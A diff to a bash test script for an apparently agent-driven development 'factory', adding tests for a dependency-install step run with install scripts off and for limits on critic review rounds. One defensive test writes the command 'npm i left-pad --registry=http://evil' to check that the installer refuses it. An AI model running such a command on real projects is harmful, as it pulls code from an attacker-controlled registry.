@@ -300,6 +300,35 @@ git checkout -q -- .scratch/depsm
 git rm -rq .scratch/depsm vendor-demo; git commit -qm "test: drop the dependency mission"
 git checkout -q "$cmds0" -- .factory/commands.env; git commit -qm "test: reset commands"
 
+echo "Install before the contract (D139)"
+inst0="$(git rev-parse HEAD)"; mkdir -p .scratch/inst "$work/fakebin"
+printf '# Inst\n**Intent:** maintenance\n\n## Dependencies\n\n- `npm i -D left-pad@^1.3.0`\n\n## Scope\n\n`package.json`\n' > .scratch/inst/spec.md
+cat > "$work/fakebin/npm" <<'NPM'
+#!/usr/bin/env bash
+echo "$*" >> "$NPM_LOG"
+printf '{"devDependencies":{"left-pad":"^1.3.0"}}\n' > package.json; echo '{"lockfileVersion":3}' > package-lock.json
+NPM
+chmod +x "$work/fakebin/npm"; git add .scratch/inst; git commit -qm "test: a dependency mission with its install named"
+out="$(bash scripts/factory/next.sh inst 2>&1)"
+[ "$(head -1 <<<"$out")" = "STEP: install" ] && grep -q 'scripts/factory/install.sh inst' <<<"$out" \
+  && t "a spec naming its npm install under ## Dependencies gets STEP: install before the contract (D139)" || fail "install step" "$out"
+PATH="$work/fakebin:$PATH" NPM_LOG="$work/npm.log" bash scripts/factory/install.sh inst >"$work/install-deps.log" 2>&1 || fail "install.sh" "$(cat "$work/install-deps.log")"
+ic="$(git log --format='%h %s' --grep='^Factory-Script: install$' -1)"
+[ "$(cat "$work/npm.log")" = "i -D left-pad@^1.3.0 --ignore-scripts" ] && grep -q 'build(inst): npm i -D left-pad@^1.3.0' <<<"$ic" \
+  && [ "$(git show --name-only --format= "${ic%% *}" | sort | paste -sd' ' -)" = "package-lock.json package.json" ] \
+  && grep -qF "$(printf 'deps\tDependencies installed by the factory (D139)\tcommit %s: package-lock.json, package.json' "${ic%% *}")" .scratch/inst/decisions.tsv \
+  && grep -q $'\tfactory (auto)\tunreviewed$' .scratch/inst/decisions.tsv && [ -z "$(git status --porcelain)" ] \
+  && t "install.sh runs the named command with install scripts off, commits manifest and lockfile, logs a deps row by factory (auto)" || fail "install.sh result" "$(cat "$work/install-deps.log" "$work/npm.log" .scratch/inst/decisions.tsv; git log --oneline -3)"
+expect_inst() { local o; o="$(bash scripts/factory/next.sh inst 2>&1)"; [ "$(head -1 <<<"$o")" = "STEP: $1" ] && t "$2" || fail "$2" "$o"; }
+expect_inst contract "once recorded, the install step is done: the contract comes next"
+grep -qF "commit ${ic%% *} (package-lock.json, package.json)" <<<"$(bash scripts/factory/brief.sh reviewer inst 01-x HEAD)" \
+  && t "the reviewer counts the factory's install commit as delivered, as a hand one (D124)" || fail "install in reviewer brief"
+printf '# Inst\n**Intent:** maintenance\n\n## Dependencies\n\n- `npm i left-pad --registry=http://evil`\n' > .scratch/inst/spec.md; rm .scratch/inst/decisions.tsv
+if PATH="$work/fakebin:$PATH" NPM_LOG="$work/npm2.log" bash scripts/factory/install.sh inst >"$work/install-deps.log" 2>&1; then fail "install.sh must refuse what isn't name@version"; fi
+grep -q 'is not name@version or a save flag' "$work/install-deps.log" && [ ! -e "$work/npm2.log" ] \
+  && t "install.sh refuses a package without a version, or any other option, before running npm" || fail "install refusal" "$(cat "$work/install-deps.log")"
+git reset -q --hard "$inst0"
+
 echo "Mission: planning"
 m=.scratch/demo
 expect_step grill "no spec"
@@ -326,13 +355,30 @@ echo "No findings. Critique result: approve" > $m/contract-critique.md
 expect_step approve "critique present, not approved"
 # D126: from the third round, next.sh says which blocking findings name a wrong
 # change that would pass (deps-node-22: 6 critiques, 5 amendments, 63 min at G1).
+# D139: a [blocking] finding goes back to the author, with no person between,
+# until the critic has had its 2 rounds; a [non-blocking] one doesn't.
+mkdir -p $m/workflows; touch $m/workflows/20260101-000000-contract.js
+printf '**Critique result:** FINDINGS\n\n- [non-blocking] wording\n' > $m/contract-critique.md
+expect_step approve "a critique with only [non-blocking] findings goes to G1 (D139)"
+printf '**Critique result:** FINDINGS\n\n- [blocking] VAL-HELLO-001: a hole.\n  Passes wrongly: a bot that never greets.\n' > $m/contract-critique.md
+out="$(bash scripts/factory/next.sh demo 2>&1)"
+[ "$(head -1 <<<"$out")" = "STEP: contract" ] && grep -q 'Critic round 1 of 2 left \[blocking\] findings: the author applies them in round 2, no person needed' <<<"$out" \
+  && t "critic round 1's [blocking] findings go back to the author without /factory-amend (D139)" || fail "auto round" "$out"
+cb="$(bash scripts/factory/brief.sh contract-critic demo)"; ab="$(bash scripts/factory/brief.sh contract-author demo)"
+grep -q 'This is critic round 2 of 2\.' <<<"$cb" && grep -q 'From round 2 on, a wrong change that nobody wrote or saw is only imagined' <<<"$cb" \
+  && grep -q 'Apply every \[blocking\] finding of the critique yourself' <<<"$ab" \
+  && t "the critic's brief carries its round and the round-2 rule; the author's says to apply the findings (D139)" || fail "round briefs" "$cb"
+touch $m/workflows/20260101-000001-contract.js
+out="$(bash scripts/factory/next.sh demo 2>&1)"
+[ "$(head -1 <<<"$out")" = "STEP: approve" ] && grep -q 'The critic used its 2 rounds and still lists \[blocking\] findings' <<<"$out" \
+  && t "after the critic's 2 rounds, open [blocking] findings go to G1, on the record (D139)" || fail "round cap" "$out"
 mkdir -p $m/amendments; printf '# Amendment request\n**Status:** done\n' | tee $m/amendments/a1.md > $m/amendments/a2.md
 printf '**Critique result:** FINDINGS\n\n### F1 — [blocking] a\n\nx\n\nPasses wrongly: a job that ignores the matrix.\n\n### F2 — b\n\n- [blocking] y\n' > $m/contract-critique.md
 out="$(bash scripts/factory/next.sh demo 2>&1)"
 grep -q 'Contract round 3: 1 of 2 blocking finding(s) name a wrong change that would pass. Approving accepts the others; it is recorded.' <<<"$out" \
   && grep -q 'Passes wrongly' .factory/briefs/contract-critic.md \
   && t "G1: from round 3, next.sh counts the blocking findings that name a wrong change that would pass (D126)" || fail "critic rounds" "$out"
-rm -rf $m/amendments; echo "No findings. Critique result: approve" > $m/contract-critique.md
+rm -rf $m/amendments $m/workflows; echo "No findings. Critique result: approve" > $m/contract-critique.md
 # D101: an approval line typed by hand (or by an agent) has no decisions.tsv row: it approves nothing.
 cp $m/spec.md "$work/spec.bak"; printf '\n**Contract approved:** %s\n' "$(date +%F)" >> $m/spec.md
 out="$(bash scripts/factory/next.sh demo 2>&1)"
